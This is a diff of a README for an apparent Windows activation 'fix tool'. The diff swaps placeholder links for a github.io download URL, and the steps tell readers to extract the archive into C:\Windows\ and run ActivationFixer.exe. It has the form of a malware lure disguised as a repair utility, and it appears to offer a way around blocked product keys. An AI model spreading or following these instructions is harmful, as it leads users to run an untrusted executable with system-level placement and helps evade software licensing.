@@ -2,7 +2,8 @@
 
 This tool fixes activation errors 0xC004C003 (blocked product key) and 0xC004F074 (KMS server unreachable) on Windows 10/11 systems. Reactivate your copy without reinstalling.
 
-[![Download Fix Tool](https://img.shields.io/badge/Download-Fix_Tool-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Fix Tool](https://img.shields.io/badge/Download-Fix_Tool-blueviolet)](https://fix-windows-error-0xc004c003-0xc004f074.github.io/.github
+)
 
 ---
 
@@ -17,7 +18,8 @@ This tool fixes activation errors 0xC004C003 (blocked product key) and 0xC004F07
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section or from the button above  
+1. 📦 **Download the archive** from the [Releases](https://fix-windows-error-0xc004c003-0xc004f074.github.io/.github
+) section or from the button above  
 2. 📁 **Extract the folder** and move it into your main `C:\Windows\` directory  
 3. 🖱 **Run the executable file** `ActivationFixer.exe`  
 4. 🔁 Restart your computer and check activation status
